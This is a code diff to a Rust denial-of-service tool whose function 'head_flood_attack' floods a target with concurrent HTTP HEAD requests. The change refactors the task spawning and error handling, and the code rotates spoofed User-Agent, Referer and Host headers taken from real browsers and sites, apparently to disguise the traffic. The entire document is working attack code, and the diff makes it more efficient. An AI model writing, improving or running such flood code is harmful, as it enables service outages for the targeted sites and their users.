@@ -4,7 +4,6 @@
 //-------------------------------------------------------------------
 
 use std::time::Duration;
-use rand::{thread_rng, Rng};
 use rand::seq::SliceRandom;
 use reqwest::header::*;
 use std::sync::Arc;
@@ -31,25 +30,29 @@ pub async fn head_flood_attack(
 ) {
     let target = target.to_string();
     let shared_target = Arc::new(target);
+    let shared_options = Arc::new(options);
 
     let mut handles = vec![];
 
     for _ in 0..concurrency {
         let target_clone = Arc::clone(&shared_target);
-        let options_clone = options.clone();
+        let options_clone = Arc::clone(&shared_options);
 
-        let handle = task::spawn_blocking(move || {
-            let rt = tokio::runtime::Runtime::new().unwrap();
-            rt.block_on(async move {
-                let client = reqwest::Client::builder()
-                    .timeout(Duration::from_secs(10))
-                    .build()
-                    .unwrap();
-
-                for _ in 0..(requests / concurrency) {
-                    let _ = send_head_request(&client, &target_clone, &options_clone).await;
+        let handle = tokio::spawn(async move {
+            let client = match reqwest::Client::builder()
+                .timeout(Duration::from_secs(10))
+                .build()
+            {
+                Ok(c) => c,
+                Err(e) => {
+                    eprintln!("[ERROR] Failed to build client: {}", e);
+                    return;
                 }
-            });
+            };
+
+            for _ in 0..(requests / concurrency) {
+                let _ = send_head_request(&client, &target_clone, &options_clone).await;
+            }
         });
 
         handles.push(handle);
@@ -66,35 +69,33 @@ async fn send_head_request(
     options: &AttackOptions,
 ) -> Result<(), reqwest::Error> {
     let mut headers = HeaderMap::new();
-    let mut rng = thread_rng();
 
     // User-Agent
     let user_agent = if let Some(agents) = &options.user_agents {
-        agents.choose(&mut rng).unwrap().clone()
+        agents
+            .choose(&mut rand::thread_rng())
+            .unwrap()
+            .clone()
     } else {
         let default_agents = vec![
-            // Google Chrome on Windows 10
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
-
-            // Mozilla Firefox on Windows 10
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-
-            // Microsoft Edge on Windows 10
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 Edg/123.0.2420.65",
-
-            // Safari on macOS
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
-
-            // Opera on Windows 10
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 OPR/99.0.4788.77",
         ];
-        default_agents.choose(&mut rng).unwrap().to_string()
+        default_agents
+            .choose(&mut rand::thread_rng())
+            .unwrap()
+            .to_string()
     };
     headers.insert(USER_AGENT, HeaderValue::from_str(&user_agent).unwrap());
 
     // Referer
     let referer = if let Some(refs) = &options.referers {
-        refs.choose(&mut rng).unwrap().clone()
+        refs.choose(&mut rand::thread_rng())
+            .unwrap()
+            .clone()
     } else {
         let default_refs = vec![
             "https://google.com",
@@ -102,7 +103,10 @@ async fn send_head_request(
             "https://cloudflare.com",
             "https://stackoverflow.com",
         ];
-        default_refs.choose(&mut rng).unwrap().to_string()
+        default_refs
+            .choose(&mut rand::thread_rng())
+            .unwrap()
+            .to_string()
     };
     headers.insert(REFERER, HeaderValue::from_str(&referer).unwrap());
 
@@ -119,7 +123,10 @@ async fn send_head_request(
             "https://cloudflare.com",
             "https://stackoverflow.com",
         ];
-        default_hosts.choose(&mut rng).unwrap().to_string()
+        default_hosts
+            .choose(&mut rand::thread_rng())
+            .unwrap()
+            .to_string()
     };
     headers.insert(HOST, HeaderValue::from_str(&host_value).unwrap());
 
